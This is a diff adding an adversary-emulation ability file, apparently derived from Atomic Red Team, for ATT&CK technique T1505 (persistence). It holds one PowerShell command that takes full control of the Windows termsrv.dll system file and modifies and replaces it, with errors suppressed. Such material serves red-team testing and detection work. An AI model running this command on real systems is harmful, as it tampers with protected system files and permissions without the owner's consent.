@@ -1,0 +1,19 @@
+- id: 40ce2b51-9b25-4b34-9c22-c9e3abd85344
+  name: Server Software Component
+  description: Ability for Server Software Component (ATT&CK T1505). Generated from
+    Atomic Red Team procedures; review and test safely before use.
+  tactic: persistence
+  technique:
+    attack_id: T1505
+    name: Server Software Component
+  platforms:
+    windows:
+      psh:
+        command: $termsrvDll = "C:\Windows\System32\termsrv.dll" $ACL = Get-Acl $termsrvDll
+          $permission = "Administrators","FullControl","Allow" $accessRule = New-Object
+          System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule)
+          Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path "C:\Windows\System32\termsrv.dll"
+          -Destination "C:\Windows\System32\termsrv_backup.dll" -ErrorAction Ignore
+          Add-Content -Path "C:\Windows\System32\termsrv.dll" -Value "`n" -NoNewline
+          -ErrorAction Ignore Move-Item -Path "C:\Windows\System32\termsrv_backup.dll"
+          -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
